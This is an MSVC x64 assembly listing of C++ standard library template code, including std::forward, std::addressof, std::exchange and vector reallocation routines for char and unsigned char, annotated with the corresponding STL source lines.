;	COMDAT ??$exchange@PEAV_Facet_base@std@@$$T@std@@YAPEAV_Facet_base@0@AEAPEAV10@$$QEA$$T@Z
_TEXT	SEGMENT
_Old_val$ = 0
_Val$ = 32
_New_val$ = 40
??$exchange@PEAV_Facet_base@std@@$$T@std@@YAPEAV_Facet_base@0@AEAPEAV10@$$QEA$$T@Z PROC ; std::exchange<std::_Facet_base *,std::nullptr_t>, COMDAT

; 723  :     conjunction_v<is_nothrow_move_constructible<_Ty>, is_nothrow_assignable<_Ty&, _Other>>) {

$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 24

; 724  :     // assign _New_val to _Val, return previous _Val
; 725  :     _Ty _Old_val = static_cast<_Ty&&>(_Val);

	mov	rax, QWORD PTR _Val$[rsp]
	mov	rax, QWORD PTR [rax]
	mov	QWORD PTR _Old_val$[rsp], rax

; 726  :     _Val         = static_cast<_Other&&>(_New_val);

	mov	rax, QWORD PTR _Val$[rsp]
	mov	rcx, QWORD PTR _New_val$[rsp]
	mov	rcx, QWORD PTR [rcx]
	mov	QWORD PTR [rax], rcx

; 727  :     return _Old_val;

	mov	rax, QWORD PTR _Old_val$[rsp]

; 728  : }

	add	rsp, 24
	ret	0
??$exchange@PEAV_Facet_base@std@@$$T@std@@YAPEAV_Facet_base@0@AEAPEAV10@$$QEA$$T@Z ENDP ; std::exchange<std::_Facet_base *,std::nullptr_t>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\type_traits
;	COMDAT ??$forward@AEAPEAD@std@@YAAEAPEADAEAPEAD@Z
_TEXT	SEGMENT
_Arg$ = 8
??$forward@AEAPEAD@std@@YAAEAPEADAEAPEAD@Z PROC		; std::forward<char * &>, COMDAT

; 1411 :     remove_reference_t<_Ty>& _Arg) noexcept { // forward an lvalue as either an lvalue or an rvalue

	mov	QWORD PTR [rsp+8], rcx

; 1412 :     return static_cast<_Ty&&>(_Arg);

	mov	rax, QWORD PTR _Arg$[rsp]

; 1413 : }

	ret	0
??$forward@AEAPEAD@std@@YAAEAPEADAEAPEAD@Z ENDP		; std::forward<char * &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xutility
;	COMDAT ??$_Voidify_iter@PEAPEAD@std@@YAPEAXPEAPEAD@Z
_TEXT	SEGMENT
_It$ = 8
??$_Voidify_iter@PEAPEAD@std@@YAPEAXPEAPEAD@Z PROC	; std::_Voidify_iter<char * *>, COMDAT

; 212  : _NODISCARD constexpr void* _Voidify_iter(_Iter _It) noexcept {

	mov	QWORD PTR [rsp+8], rcx

; 213  :     if constexpr (is_pointer_v<_Iter>) {
; 214  :         return const_cast<void*>(static_cast<const volatile void*>(_It));

	mov	rax, QWORD PTR _It$[rsp]

; 215  :     } else {
; 216  :         return const_cast<void*>(static_cast<const volatile void*>(_STD addressof(*_It)));
; 217  :     }
; 218  : }

	ret	0
??$_Voidify_iter@PEAPEAD@std@@YAPEAXPEAPEAD@Z ENDP	; std::_Voidify_iter<char * *>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstddef
;	COMDAT ??$addressof@PEAD@std@@YAPEAPEADAEAPEAD@Z
_TEXT	SEGMENT
_Val$ = 8
??$addressof@PEAD@std@@YAPEAPEADAEAPEAD@Z PROC		; std::addressof<char *>, COMDAT

; 252  : _NODISCARD constexpr _Ty* addressof(_Ty& _Val) noexcept {

	mov	QWORD PTR [rsp+8], rcx

; 253  :     return __builtin_addressof(_Val);

	mov	rax, QWORD PTR _Val$[rsp]

; 254  : }

	ret	0
??$addressof@PEAD@std@@YAPEAPEADAEAPEAD@Z ENDP		; std::addressof<char *>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\type_traits
;	COMDAT ??$forward@AEAPEA_W@std@@YAAEAPEA_WAEAPEA_W@Z
_TEXT	SEGMENT
_Arg$ = 8
??$forward@AEAPEA_W@std@@YAAEAPEA_WAEAPEA_W@Z PROC	; std::forward<wchar_t * &>, COMDAT

; 1411 :     remove_reference_t<_Ty>& _Arg) noexcept { // forward an lvalue as either an lvalue or an rvalue

	mov	QWORD PTR [rsp+8], rcx

; 1412 :     return static_cast<_Ty&&>(_Arg);

	mov	rax, QWORD PTR _Arg$[rsp]

; 1413 : }

	ret	0
??$forward@AEAPEA_W@std@@YAAEAPEA_WAEAPEA_W@Z ENDP	; std::forward<wchar_t * &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xutility
;	COMDAT ??$_Voidify_iter@PEAPEA_W@std@@YAPEAXPEAPEA_W@Z
_TEXT	SEGMENT
_It$ = 8
??$_Voidify_iter@PEAPEA_W@std@@YAPEAXPEAPEA_W@Z PROC	; std::_Voidify_iter<wchar_t * *>, COMDAT

; 212  : _NODISCARD constexpr void* _Voidify_iter(_Iter _It) noexcept {

	mov	QWORD PTR [rsp+8], rcx

; 213  :     if constexpr (is_pointer_v<_Iter>) {
; 214  :         return const_cast<void*>(static_cast<const volatile void*>(_It));

	mov	rax, QWORD PTR _It$[rsp]

; 215  :     } else {
; 216  :         return const_cast<void*>(static_cast<const volatile void*>(_STD addressof(*_It)));
; 217  :     }
; 218  : }

	ret	0
??$_Voidify_iter@PEAPEA_W@std@@YAPEAXPEAPEA_W@Z ENDP	; std::_Voidify_iter<wchar_t * *>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstddef
;	COMDAT ??$addressof@PEA_W@std@@YAPEAPEA_WAEAPEA_W@Z
_TEXT	SEGMENT
_Val$ = 8
??$addressof@PEA_W@std@@YAPEAPEA_WAEAPEA_W@Z PROC	; std::addressof<wchar_t *>, COMDAT

; 252  : _NODISCARD constexpr _Ty* addressof(_Ty& _Val) noexcept {

	mov	QWORD PTR [rsp+8], rcx

; 253  :     return __builtin_addressof(_Val);

	mov	rax, QWORD PTR _Val$[rsp]

; 254  : }

	ret	0
??$addressof@PEA_W@std@@YAPEAPEA_WAEAPEA_W@Z ENDP	; std::addressof<wchar_t *>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xutility
;	COMDAT ??$_Construct_in_place@PEADAEBQEAD@std@@YAXAEAPEADAEBQEAD@Z
_TEXT	SEGMENT
$T1 = 32
_Obj$ = 64
<_Args_0>$ = 72
??$_Construct_in_place@PEADAEBQEAD@std@@YAXAEAPEADAEBQEAD@Z PROC ; std::_Construct_in_place<char *,char * const &>, COMDAT

; 231  :     is_nothrow_constructible_v<_Ty, _Types...>) {

$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 232  : #if _HAS_CXX20
; 233  :     if (_STD is_constant_evaluated()) {
; 234  :         _STD construct_at(_STD addressof(_Obj), _STD forward<_Types>(_Args)...);
; 235  :     } else
; 236  : #endif // _HAS_CXX20
; 237  :     {
; 238  :         ::new (_Voidify_iter(_STD addressof(_Obj))) _Ty(_STD forward<_Types>(_Args)...);

	mov	rcx, QWORD PTR _Obj$[rsp]
	call	??$addressof@PEAD@std@@YAPEAPEADAEAPEAD@Z ; std::addressof<char *>
	mov	rcx, rax
	call	??$_Voidify_iter@PEAPEAD@std@@YAPEAXPEAPEAD@Z ; std::_Voidify_iter<char * *>
	mov	rdx, rax
	mov	ecx, 8
	call	??2@YAPEAX_KPEAX@Z			; operator new
	mov	QWORD PTR $T1[rsp], rax
	mov	rcx, QWORD PTR <_Args_0>$[rsp]
	call	??$forward@AEBQEAD@std@@YAAEBQEADAEBQEAD@Z ; std::forward<char * const &>
	mov	rcx, QWORD PTR $T1[rsp]
	mov	rax, QWORD PTR [rax]
	mov	QWORD PTR [rcx], rax

; 239  :     }
; 240  : }

	add	rsp, 56					; 00000038H
	ret	0
??$_Construct_in_place@PEADAEBQEAD@std@@YAXAEAPEADAEBQEAD@Z ENDP ; std::_Construct_in_place<char *,char * const &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\type_traits
;	COMDAT ??$forward@V?$allocator@D@std@@@std@@YA$$QEAV?$allocator@D@0@AEAV10@@Z
_TEXT	SEGMENT
_Arg$ = 8
??$forward@V?$allocator@D@std@@@std@@YA$$QEAV?$allocator@D@0@AEAV10@@Z PROC ; std::forward<std::allocator<char> >, COMDAT

; 1411 :     remove_reference_t<_Ty>& _Arg) noexcept { // forward an lvalue as either an lvalue or an rvalue

	mov	QWORD PTR [rsp+8], rcx

; 1412 :     return static_cast<_Ty&&>(_Arg);

	mov	rax, QWORD PTR _Arg$[rsp]

; 1413 : }

	ret	0
??$forward@V?$allocator@D@std@@@std@@YA$$QEAV?$allocator@D@0@AEAV10@@Z ENDP ; std::forward<std::allocator<char> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xutility
;	COMDAT ??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z
_TEXT	SEGMENT
$T1 = 32
_Obj$ = 64
<_Args_0>$ = 72
??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z PROC ; std::_Construct_in_place<wchar_t *,wchar_t * const &>, COMDAT

; 231  :     is_nothrow_constructible_v<_Ty, _Types...>) {

$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 232  : #if _HAS_CXX20
; 233  :     if (_STD is_constant_evaluated()) {
; 234  :         _STD construct_at(_STD addressof(_Obj), _STD forward<_Types>(_Args)...);
; 235  :     } else
; 236  : #endif // _HAS_CXX20
; 237  :     {
; 238  :         ::new (_Voidify_iter(_STD addressof(_Obj))) _Ty(_STD forward<_Types>(_Args)...);

	mov	rcx, QWORD PTR _Obj$[rsp]
	call	??$addressof@PEA_W@std@@YAPEAPEA_WAEAPEA_W@Z ; std::addressof<wchar_t *>
	mov	rcx, rax
	call	??$_Voidify_iter@PEAPEA_W@std@@YAPEAXPEAPEA_W@Z ; std::_Voidify_iter<wchar_t * *>
	mov	rdx, rax
	mov	ecx, 8
	call	??2@YAPEAX_KPEAX@Z			; operator new
	mov	QWORD PTR $T1[rsp], rax
	mov	rcx, QWORD PTR <_Args_0>$[rsp]
	call	??$forward@AEBQEA_W@std@@YAAEBQEA_WAEBQEA_W@Z ; std::forward<wchar_t * const &>
	mov	rcx, QWORD PTR $T1[rsp]
	mov	rax, QWORD PTR [rax]
	mov	QWORD PTR [rcx], rax

; 239  :     }
; 240  : }

	add	rsp, 56					; 00000038H
	ret	0
??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z ENDP ; std::_Construct_in_place<wchar_t *,wchar_t * const &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\type_traits
;	COMDAT ??$forward@V?$allocator@_W@std@@@std@@YA$$QEAV?$allocator@_W@0@AEAV10@@Z
_TEXT	SEGMENT
_Arg$ = 8
??$forward@V?$allocator@_W@std@@@std@@YA$$QEAV?$allocator@_W@0@AEAV10@@Z PROC ; std::forward<std::allocator<wchar_t> >, COMDAT

; 1411 :     remove_reference_t<_Ty>& _Arg) noexcept { // forward an lvalue as either an lvalue or an rvalue

	mov	QWORD PTR [rsp+8], rcx

; 1412 :     return static_cast<_Ty&&>(_Arg);

	mov	rax, QWORD PTR _Arg$[rsp]

; 1413 : }

	ret	0
??$forward@V?$allocator@_W@std@@@std@@YA$$QEAV?$allocator@_W@0@AEAV10@@Z ENDP ; std::forward<std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vector
;	COMDAT ??$_Emplace_reallocate@AEBD@?$vector@DV?$allocator@D@std@@@std@@AEAAPEADQEADAEBD@Z
_TEXT	SEGMENT
_Newvec$ = 32
_Al$ = 40
_Whereoff$ = 48
_Myfirst$ = 56
_Mylast$ = 64
_Constructed_first$ = 72
_Newcapacity$ = 80
_My_data$ = 88
_Oldsize$ = 96
_Constructed_last$ = 104
_Newsize$ = 112
tv87 = 120
this$ = 144
_Whereptr$ = 152
<_Val_0>$ = 160
??$_Emplace_reallocate@AEBD@?$vector@DV?$allocator@D@std@@@std@@AEAAPEADQEADAEBD@Z PROC ; std::vector<char,std::allocator<char> >::_Emplace_reallocate<char const &>, COMDAT

; 852  :     _CONSTEXPR20 pointer _Emplace_reallocate(const pointer _Whereptr, _Valty&&... _Val) {

$LN13:
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 136				; 00000088H

; 853  :         // reallocate and insert by perfectly forwarding _Val at _Whereptr
; 854  :         _Alty& _Al        = _Getal();

	mov	rcx, QWORD PTR this$[rsp]
	call	?_Getal@?$vector@DV?$allocator@D@std@@@std@@AEAAAEAV?$allocator@D@2@XZ ; std::vector<char,std::allocator<char> >::_Getal
	mov	QWORD PTR _Al$[rsp], rax

; 855  :         auto& _My_data    = _Mypair._Myval2;

	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR _My_data$[rsp], rax

; 856  :         pointer& _Myfirst = _My_data._Myfirst;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	QWORD PTR _Myfirst$[rsp], rax

; 857  :         pointer& _Mylast  = _My_data._Mylast;

	mov	rax, QWORD PTR _My_data$[rsp]
	add	rax, 8
	mov	QWORD PTR _Mylast$[rsp], rax

; 858  : 
; 859  :         _STL_INTERNAL_CHECK(_Mylast == _My_data._Myend); // check that we have no unused capacity
; 860  : 
; 861  :         const auto _Whereoff = static_cast<size_type>(_Whereptr - _Myfirst);

	mov	rax, QWORD PTR _Myfirst$[rsp]
	mov	rax, QWORD PTR [rax]
	mov	rcx, QWORD PTR _Whereptr$[rsp]
	sub	rcx, rax
	mov	rax, rcx
	mov	QWORD PTR _Whereoff$[rsp], rax

; 862  :         const auto _Oldsize  = static_cast<size_type>(_Mylast - _Myfirst);

	mov	rax, QWORD PTR _Mylast$[rsp]
	mov	rcx, QWORD PTR _Myfirst$[rsp]
	mov	rcx, QWORD PTR [rcx]
	mov	rax, QWORD PTR [rax]
	sub	rax, rcx
	mov	QWORD PTR _Oldsize$[rsp], rax

; 863  : 
; 864  :         if (_Oldsize == max_size()) {

	mov	rcx, QWORD PTR this$[rsp]
	call	?max_size@?$vector@DV?$allocator@D@std@@@std@@QEBA_KXZ ; std::vector<char,std::allocator<char> >::max_size
	cmp	QWORD PTR _Oldsize$[rsp], rax
	jne	SHORT $LN2@Emplace_re

; 865  :             _Xlength();

	call	?_Xlength@?$vector@DV?$allocator@D@std@@@std@@CAXXZ ; std::vector<char,std::allocator<char> >::_Xlength
$LN2@Emplace_re:

; 866  :         }
; 867  : 
; 868  :         const size_type _Newsize     = _Oldsize + 1;

	mov	rax, QWORD PTR _Oldsize$[rsp]
	inc	rax
	mov	QWORD PTR _Newsize$[rsp], rax

; 869  :         const size_type _Newcapacity = _Calculate_growth(_Newsize);

	mov	rdx, QWORD PTR _Newsize$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Calculate_growth@?$vector@DV?$allocator@D@std@@@std@@AEBA_K_K@Z ; std::vector<char,std::allocator<char> >::_Calculate_growth
	mov	QWORD PTR _Newcapacity$[rsp], rax

; 870  : 
; 871  :         const pointer _Newvec           = _Al.allocate(_Newcapacity);

	mov	rdx, QWORD PTR _Newcapacity$[rsp]
	mov	rcx, QWORD PTR _Al$[rsp]
	call	?allocate@?$allocator@D@std@@QEAAPEAD_K@Z ; std::allocator<char>::allocate
	mov	QWORD PTR _Newvec$[rsp], rax

; 872  :         const pointer _Constructed_last = _Newvec + _Whereoff + 1;

	mov	rax, QWORD PTR _Newvec$[rsp]
	mov	rcx, QWORD PTR _Whereoff$[rsp]
	lea	rax, QWORD PTR [rax+rcx+1]
	mov	QWORD PTR _Constructed_last$[rsp], rax

; 873  :         pointer _Constructed_first      = _Constructed_last;

	mov	rax, QWORD PTR _Constructed_last$[rsp]
	mov	QWORD PTR _Constructed_first$[rsp], rax

; 874  : 
; 875  :         _TRY_BEGIN
; 876  :         _Alty_traits::construct(_Al, _Unfancy(_Newvec + _Whereoff), _STD forward<_Valty>(_Val)...);

	mov	rcx, QWORD PTR <_Val_0>$[rsp]
	call	??$forward@AEBD@std@@YAAEBDAEBD@Z	; std::forward<char const &>
	mov	QWORD PTR tv87[rsp], rax
	mov	rcx, QWORD PTR _Whereoff$[rsp]
	mov	rdx, QWORD PTR _Newvec$[rsp]
	add	rdx, rcx
	mov	rcx, rdx
	call	??$_Unfancy@D@std@@YAPEADPEAD@Z		; std::_Unfancy<char>
	mov	rcx, QWORD PTR tv87[rsp]
	mov	r8, rcx
	mov	rdx, rax
	mov	rcx, QWORD PTR _Al$[rsp]
	call	??$construct@DAEBD@?$_Default_allocator_traits@V?$allocator@D@std@@@std@@SAXAEAV?$allocator@D@1@QEADAEBD@Z ; std::_Default_allocator_traits<std::allocator<char> >::construct<char,char const &>

; 877  :         _Constructed_first = _Newvec + _Whereoff;

	mov	rax, QWORD PTR _Whereoff$[rsp]
	mov	rcx, QWORD PTR _Newvec$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	QWORD PTR _Constructed_first$[rsp], rax

; 878  : 
; 879  :         if (_Whereptr == _Mylast) { // at back, provide strong guarantee

	mov	rax, QWORD PTR _Mylast$[rsp]
	mov	rax, QWORD PTR [rax]
	cmp	QWORD PTR _Whereptr$[rsp], rax
	jne	SHORT $LN4@Emplace_re

; 880  :             if constexpr (is_nothrow_move_constructible_v<_Ty> || !is_copy_constructible_v<_Ty>) {
; 881  :                 _Uninitialized_move(_Myfirst, _Mylast, _Newvec, _Al);

	mov	r9, QWORD PTR _Al$[rsp]
	mov	r8, QWORD PTR _Newvec$[rsp]
	mov	rax, QWORD PTR _Mylast$[rsp]
	mov	rdx, QWORD PTR [rax]
	mov	rax, QWORD PTR _Myfirst$[rsp]
	mov	rcx, QWORD PTR [rax]
	call	??$_Uninitialized_move@PEADV?$allocator@D@std@@@std@@YAPEADQEAD0PEADAEAV?$allocator@D@0@@Z ; std::_Uninitialized_move<char *,std::allocator<char> >

; 882  :             } else {
; 883  :                 _Uninitialized_copy(_Myfirst, _Mylast, _Newvec, _Al);
; 884  :             }
; 885  :         } else { // provide basic guarantee

	jmp	SHORT $LN5@Emplace_re
$LN4@Emplace_re:

; 886  :             _Uninitialized_move(_Myfirst, _Whereptr, _Newvec, _Al);

	mov	r9, QWORD PTR _Al$[rsp]
	mov	r8, QWORD PTR _Newvec$[rsp]
	mov	rdx, QWORD PTR _Whereptr$[rsp]
	mov	rax, QWORD PTR _Myfirst$[rsp]
	mov	rcx, QWORD PTR [rax]
	call	??$_Uninitialized_move@PEADV?$allocator@D@std@@@std@@YAPEADQEAD0PEADAEAV?$allocator@D@0@@Z ; std::_Uninitialized_move<char *,std::allocator<char> >

; 887  :             _Constructed_first = _Newvec;

	mov	rax, QWORD PTR _Newvec$[rsp]
	mov	QWORD PTR _Constructed_first$[rsp], rax

; 888  :             _Uninitialized_move(_Whereptr, _Mylast, _Newvec + _Whereoff + 1, _Al);

	mov	rax, QWORD PTR _Newvec$[rsp]
	mov	rcx, QWORD PTR _Whereoff$[rsp]
	lea	rax, QWORD PTR [rax+rcx+1]
	mov	r9, QWORD PTR _Al$[rsp]
	mov	r8, rax
	mov	rax, QWORD PTR _Mylast$[rsp]
	mov	rdx, QWORD PTR [rax]
	mov	rcx, QWORD PTR _Whereptr$[rsp]
	call	??$_Uninitialized_move@PEADV?$allocator@D@std@@@std@@YAPEADQEAD0PEADAEAV?$allocator@D@0@@Z ; std::_Uninitialized_move<char *,std::allocator<char> >
	npad	1
$LN5@Emplace_re:
	jmp	SHORT $LN9@Emplace_re
$LN10@Emplace_re:
$LN9@Emplace_re:

; 889  :         }
; 890  :         _CATCH_ALL
; 891  :         _Destroy_range(_Constructed_first, _Constructed_last, _Al);
; 892  :         _Al.deallocate(_Newvec, _Newcapacity);
; 893  :         _RERAISE;
; 894  :         _CATCH_END
; 895  : 
; 896  :         _Change_array(_Newvec, _Newsize, _Newcapacity);

	mov	r9, QWORD PTR _Newcapacity$[rsp]
	mov	r8, QWORD PTR _Newsize$[rsp]
	mov	rdx, QWORD PTR _Newvec$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Change_array@?$vector@DV?$allocator@D@std@@@std@@AEAAXQEAD_K1@Z ; std::vector<char,std::allocator<char> >::_Change_array

; 897  :         return _Newvec + _Whereoff;

	mov	rax, QWORD PTR _Whereoff$[rsp]
	mov	rcx, QWORD PTR _Newvec$[rsp]
	add	rcx, rax
	mov	rax, rcx

; 898  :     }

	add	rsp, 136				; 00000088H
	ret	0
$LN11@Emplace_re:
??$_Emplace_reallocate@AEBD@?$vector@DV?$allocator@D@std@@@std@@AEAAPEADQEADAEBD@Z ENDP ; std::vector<char,std::allocator<char> >::_Emplace_reallocate<char const &>
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
_Newvec$ = 32
_Al$ = 40
_Whereoff$ = 48
_Myfirst$ = 56
_Mylast$ = 64
_Constructed_first$ = 72
_Newcapacity$ = 80
_My_data$ = 88
_Oldsize$ = 96
_Constructed_last$ = 104
_Newsize$ = 112
tv87 = 120
this$ = 144
_Whereptr$ = 152
<_Val_0>$ = 160
?catch$0@?0???$_Emplace_reallocate@AEBD@?$vector@DV?$allocator@D@std@@@std@@AEAAPEADQEADAEBD@Z@4HA PROC ; `std::vector<char,std::allocator<char> >::_Emplace_reallocate<char const &>'::`1'::catch$0

; 890  :         _CATCH_ALL

	mov	QWORD PTR [rsp+16], rdx
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
__catch$??$_Emplace_reallocate@AEBD@?$vector@DV?$allocator@D@std@@@std@@AEAAPEADQEADAEBD@Z$0:

; 891  :         _Destroy_range(_Constructed_first, _Constructed_last, _Al);

	mov	r8, QWORD PTR _Al$[rbp]
	mov	rdx, QWORD PTR _Constructed_last$[rbp]
	mov	rcx, QWORD PTR _Constructed_first$[rbp]
	call	??$_Destroy_range@V?$allocator@D@std@@@std@@YAXPEADQEADAEAV?$allocator@D@0@@Z ; std::_Destroy_range<std::allocator<char> >

; 892  :         _Al.deallocate(_Newvec, _Newcapacity);

	mov	r8, QWORD PTR _Newcapacity$[rbp]
	mov	rdx, QWORD PTR _Newvec$[rbp]
	mov	rcx, QWORD PTR _Al$[rbp]
	call	?deallocate@?$allocator@D@std@@QEAAXQEAD_K@Z ; std::allocator<char>::deallocate

; 893  :         _RERAISE;

	xor	edx, edx
	xor	ecx, ecx
	call	_CxxThrowException
	npad	1

; 894  :         _CATCH_END

	lea	rax, $LN10@catch$0
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
	int	3
?catch$0@?0???$_Emplace_reallocate@AEBD@?$vector@DV?$allocator@D@std@@@std@@AEAAPEADQEADAEBD@Z@4HA ENDP ; `std::vector<char,std::allocator<char> >::_Emplace_reallocate<char const &>'::`1'::catch$0
text$x	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vector
;	COMDAT ??$_Emplace_back_with_unused_capacity@AEBD@?$vector@DV?$allocator@D@std@@@std@@AEAAAEADAEBD@Z
_TEXT	SEGMENT
_Mylast$ = 32
_My_data$ = 40
_Result$ = 48
this$ = 80
<_Val_0>$ = 88
??$_Emplace_back_with_unused_capacity@AEBD@?$vector@DV?$allocator@D@std@@@std@@AEAAAEADAEBD@Z PROC ; std::vector<char,std::allocator<char> >::_Emplace_back_with_unused_capacity<char const &>, COMDAT

; 829  :     _CONSTEXPR20 _Ty& _Emplace_back_with_unused_capacity(_Valty&&... _Val) {

$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 72					; 00000048H

; 830  :         // insert by perfectly forwarding into element at end, provide strong guarantee
; 831  :         auto& _My_data   = _Mypair._Myval2;

	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR _My_data$[rsp], rax

; 832  :         pointer& _Mylast = _My_data._Mylast;

	mov	rax, QWORD PTR _My_data$[rsp]
	add	rax, 8
	mov	QWORD PTR _Mylast$[rsp], rax

; 833  :         _STL_INTERNAL_CHECK(_Mylast != _My_data._Myend); // check that we have unused capacity
; 834  :         if constexpr (conjunction_v<is_nothrow_constructible<_Ty, _Valty...>,
; 835  :                           _Uses_default_construct<_Alloc, _Ty*, _Valty...>>) {
; 836  :             _ASAN_VECTOR_MODIFY(1);
; 837  :             _Construct_in_place(*_Mylast, _STD forward<_Valty>(_Val)...);

	mov	rcx, QWORD PTR <_Val_0>$[rsp]
	call	??$forward@AEBD@std@@YAAEBDAEBD@Z	; std::forward<char const &>
	mov	rdx, rax
	mov	rax, QWORD PTR _Mylast$[rsp]
	mov	rcx, QWORD PTR [rax]
	call	??$_Construct_in_place@DAEBD@std@@YAXAEADAEBD@Z ; std::_Construct_in_place<char,char const &>

; 838  :         } else {
; 839  :             _ASAN_VECTOR_EXTEND_GUARD(static_cast<size_type>(_Mylast - _My_data._Myfirst) + 1);
; 840  :             _Alty_traits::construct(_Getal(), _Unfancy(_Mylast), _STD forward<_Valty>(_Val)...);
; 841  :             _ASAN_VECTOR_RELEASE_GUARD;
; 842  :         }
; 843  : 
; 844  :         _Orphan_range(_Mylast, _Mylast);

	mov	rax, QWORD PTR _Mylast$[rsp]
	mov	r8, QWORD PTR [rax]
	mov	rax, QWORD PTR _Mylast$[rsp]
	mov	rdx, QWORD PTR [rax]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Orphan_range@?$vector@DV?$allocator@D@std@@@std@@AEBAXPEAD0@Z ; std::vector<char,std::allocator<char> >::_Orphan_range

; 845  :         _Ty& _Result = *_Mylast;

	mov	rax, QWORD PTR _Mylast$[rsp]
	mov	rax, QWORD PTR [rax]
	mov	QWORD PTR _Result$[rsp], rax

; 846  :         ++_Mylast;

	mov	rax, QWORD PTR _Mylast$[rsp]
	mov	rax, QWORD PTR [rax]
	inc	rax
	mov	rcx, QWORD PTR _Mylast$[rsp]
	mov	QWORD PTR [rcx], rax

; 847  : 
; 848  :         return _Result;

	mov	rax, QWORD PTR _Result$[rsp]

; 849  :     }

	add	rsp, 72					; 00000048H
	ret	0
??$_Emplace_back_with_unused_capacity@AEBD@?$vector@DV?$allocator@D@std@@@std@@AEAAAEADAEBD@Z ENDP ; std::vector<char,std::allocator<char> >::_Emplace_back_with_unused_capacity<char const &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vector
;	COMDAT ??$_Emplace_reallocate@AEBE@?$vector@EV?$allocator@E@std@@@std@@AEAAPEAEQEAEAEBE@Z
_TEXT	SEGMENT
_Newvec$ = 32
_Al$ = 40
_Whereoff$ = 48
_Myfirst$ = 56
_Mylast$ = 64
_Constructed_first$ = 72
_Newcapacity$ = 80
_My_data$ = 88
_Oldsize$ = 96
_Constructed_last$ = 104
_Newsize$ = 112
tv87 = 120
this$ = 144
_Whereptr$ = 152
<_Val_0>$ = 160
??$_Emplace_reallocate@AEBE@?$vector@EV?$allocator@E@std@@@std@@AEAAPEAEQEAEAEBE@Z PROC ; std::vector<unsigned char,std::allocator<unsigned char> >::_Emplace_reallocate<unsigned char const &>, COMDAT

; 852  :     _CONSTEXPR20 pointer _Emplace_reallocate(const pointer _Whereptr, _Valty&&... _Val) {

$LN13:
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 136				; 00000088H

; 853  :         // reallocate and insert by perfectly forwarding _Val at _Whereptr
; 854  :         _Alty& _Al        = _Getal();

	mov	rcx, QWORD PTR this$[rsp]
	call	?_Getal@?$vector@EV?$allocator@E@std@@@std@@AEAAAEAV?$allocator@E@2@XZ ; std::vector<unsigned char,std::allocator<unsigned char> >::_Getal
	mov	QWORD PTR _Al$[rsp], rax

; 855  :         auto& _My_data    = _Mypair._Myval2;

	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR _My_data$[rsp], rax

; 856  :         pointer& _Myfirst = _My_data._Myfirst;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	QWORD PTR _Myfirst$[rsp], rax

; 857  :         pointer& _Mylast  = _My_data._Mylast;

	mov	rax, QWORD PTR _My_data$[rsp]
	add	rax, 8
	mov	QWORD PTR _Mylast$[rsp], rax

; 858  : 
; 859  :         _STL_INTERNAL_CHECK(_Mylast == _My_data._Myend); // check that we have no unused capacity
; 860  : 
; 861  :         const auto _Whereoff = static_cast<size_type>(_Whereptr - _Myfirst);

	mov	rax, QWORD PTR _Myfirst$[rsp]
	mov	rax, QWORD PTR [rax]
